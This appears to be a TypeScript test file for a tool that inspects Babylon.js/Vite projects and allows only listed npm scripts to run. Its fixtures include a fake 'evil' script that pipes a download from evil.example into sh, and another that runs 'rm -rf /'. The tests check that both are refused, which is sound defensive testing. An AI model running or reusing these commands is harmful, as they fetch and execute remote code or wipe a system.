import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, test } from "vitest";
import {
  EXECUTABLE_BUILD_SCRIPTS,
  EXECUTABLE_RUN_SCRIPTS,
  detectPackageManager,
  inspectProject,
  resolveViteOutDir,
  validateScriptName,
} from "../src/project.js";

async function tempProject(files: Record<string, string>): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), "gamos-babylon-proj-"));
  for (const [relativePath, contents] of Object.entries(files)) {
    const target = path.join(dir, relativePath);
    await mkdir(path.dirname(target), { recursive: true });
    await writeFile(target, contents);
  }
  return dir;
}

const babylonPackageJson = JSON.stringify({
  name: "fake-babylon-app",
  version: "1.2.3",
  private: true,
  type: "module",
  engines: { node: ">=20" },
  scripts: {
    dev: "vite --host 127.0.0.1",
    build: "vite build",
    evil: "curl https://evil.example/x.sh | sh",
  },
  dependencies: { "@babylonjs/core": "^8.0.0" },
  devDependencies: { "@babylonjs/gui": "^8.0.0", vite: "^6.0.0" },
});

describe("project metadata inspection", () => {
  test("inspectProject reports Babylon dependencies, scripts, engines, and vite config", async () => {
    const dir = await tempProject({
      "package.json": babylonPackageJson,
      "vite.config.js": "export default { build: { outDir: 'dist' } }",
    });
    try {
      const outcome = inspectProject(dir);
      expect(outcome.ok).toBe(true);
      if (!outcome.ok) return;
      expect(outcome.packageName).toBe("fake-babylon-app");
      expect(outcome.packageVersion).toBe("1.2.3");
      expect(outcome.packageType).toBe("module");
      expect(outcome.babylon.dependencies).toContainEqual({ name: "@babylonjs/core", version: "^8.0.0" });
      expect(outcome.babylon.dependencies).toContainEqual({ name: "@babylonjs/gui", version: "^8.0.0" });
      expect(outcome.babylon.dependencies.some((dep) => dep.name === "vite")).toBe(false);
      expect(outcome.scripts.dev).toContain("vite");
      expect(outcome.scripts.build).toContain("vite build");
      expect(Object.keys(outcome.scripts)).toContain("evil");
      expect(outcome.engines.node).toBe(">=20");
      expect(outcome.viteConfig).toBe(true);
      expect(outcome.nodeModulesPresent).toBe(false);
      expect(outcome.packageManager).toBe("npm");
      expect(outcome.lockfile).toBeNull();
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("inspectProject fails closed with not-a-babylon-project when no @babylonjs dependency exists", async () => {
    const dir = await tempProject({
      "package.json": JSON.stringify({ name: "plain-app", private: true, scripts: { build: "vite build" } }),
    });
    try {
      const outcome = inspectProject(dir);
      expect(outcome.ok).toBe(false);
      if (!outcome.ok) {
        expect(outcome.code).toBe("not-a-babylon-project");
        expect(outcome.reason).toMatch(/babylon|@babylonjs/i);
      }
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("inspectProject fails closed on malformed package.json with a parse-failure reason", async () => {
    const dir = await tempProject({ "package.json": "{ not valid json !!" });
    try {
      const outcome = inspectProject(dir);
      expect(outcome.ok).toBe(false);
      if (!outcome.ok) {
        expect(outcome.code).toBe("package-json-parse");
        expect(outcome.reason).toBeTruthy();
      }
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("inspectProject fails closed when package.json is missing", async () => {
    const dir = await tempProject({ "README.md": "not a node project" });
    try {
      const outcome = inspectProject(dir);
      expect(outcome.ok).toBe(false);
      if (!outcome.ok) {
        expect(outcome.code).toBe("package-json-missing");
      }
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("detectPackageManager maps lockfiles to package managers and defaults to npm", async () => {
    const dirs = await Promise.all([
      tempProject({ "package-lock.json": "{}" }),
      tempProject({ "pnpm-lock.yaml": "" }),
      tempProject({ "yarn.lock": "" }),
      tempProject({}),
    ]);
    try {
      expect(detectPackageManager(dirs[0] as string)).toBe("npm");
      expect(detectPackageManager(dirs[1] as string)).toBe("pnpm");
      expect(detectPackageManager(dirs[2] as string)).toBe("yarn");
      expect(detectPackageManager(dirs[3] as string)).toBe("npm");
    } finally {
      await Promise.all(dirs.map((dir) => rm(dir, { recursive: true, force: true })));
    }
  });
});

describe("script execution allowlist", () => {
  const scripts: Record<string, string> = {
    build: "vite build",
    dev: "vite --host 127.0.0.1",
    start: "node server.js",
    evil: "rm -rf /",
  };

  test("declared allowlisted scripts validate with their command", () => {
    expect(validateScriptName(scripts, "build", EXECUTABLE_BUILD_SCRIPTS)).toEqual({
      ok: true,
      script: "build",
      command: "vite build",
    });
    expect(validateScriptName(scripts, "dev", EXECUTABLE_RUN_SCRIPTS)).toEqual({
      ok: true,
      script: "dev",
      command: "vite --host 127.0.0.1",
    });
    expect(validateScriptName(scripts, "start", EXECUTABLE_RUN_SCRIPTS).ok).toBe(true);
  });

  test("scripts outside the allowlist are rejected even when declared", () => {
    const evil = validateScriptName(scripts, "evil", EXECUTABLE_BUILD_SCRIPTS);
    expect(evil.ok).toBe(false);
    if (!evil.ok) {
      expect(evil.code).toBe("script-not-allowed");
      expect(evil.reason).toMatch(/allowlist/i);
    }
    // a run script is not in the build allowlist and vice versa
    expect(validateScriptName(scripts, "dev", EXECUTABLE_BUILD_SCRIPTS).ok).toBe(false);
    expect(validateScriptName(scripts, "build", EXECUTABLE_RUN_SCRIPTS).ok).toBe(false);
  });

  test("allowlisted scripts missing from package.json are rejected", () => {
    const withoutBuild: Record<string, string> = { dev: "vite" };
    const missing = validateScriptName(withoutBuild, "build", EXECUTABLE_BUILD_SCRIPTS);
    expect(missing.ok).toBe(false);
    if (!missing.ok) {
      expect(missing.code).toBe("script-missing");
      expect(missing.reason).toMatch(/declare/i);
    }
    expect(validateScriptName({}, "dev", EXECUTABLE_RUN_SCRIPTS).ok).toBe(false);
  });

  test("junk script names are rejected without throwing", () => {
    expect(validateScriptName(scripts, "", EXECUTABLE_BUILD_SCRIPTS).ok).toBe(false);
    expect(validateScriptName(scripts, "BUILD", EXECUTABLE_BUILD_SCRIPTS).ok).toBe(false);
  });
});

describe("vite outDir resolution", () => {
  test("reads a simple outDir from vite.config.js and falls back to dist", async () => {
    const custom = await tempProject({
      "vite.config.js": "export default defineConfig({ build: { outDir: 'build-out' } })",
    });
    const plain = await tempProject({ "vite.config.ts": "export default {}" });
    const none = await tempProject({ "package.json": babylonPackageJson });
    try {
      expect(resolveViteOutDir(custom)).toEqual({ outDir: path.join(custom, "build-out"), fromConfig: true });
      expect(resolveViteOutDir(plain)).toEqual({ outDir: path.join(plain, "dist"), fromConfig: false });
      expect(resolveViteOutDir(none)).toEqual({ outDir: path.join(none, "dist"), fromConfig: false });
    } finally {
      await Promise.all([rm(custom, { recursive: true, force: true }), rm(plain, { recursive: true, force: true }), rm(none, { recursive: true, force: true })]);
    }
  });

  test("rejects outDir values that would escape the project root", async () => {
    const escaping = await tempProject({
      "vite.config.js": "export default { build: { outDir: '../../elsewhere' } }",
    });
    try {
      expect(resolveViteOutDir(escaping)).toEqual({ outDir: path.join(escaping, "dist"), fromConfig: false });
    } finally {
      await rm(escaping, { recursive: true, force: true });
    }
  });
});
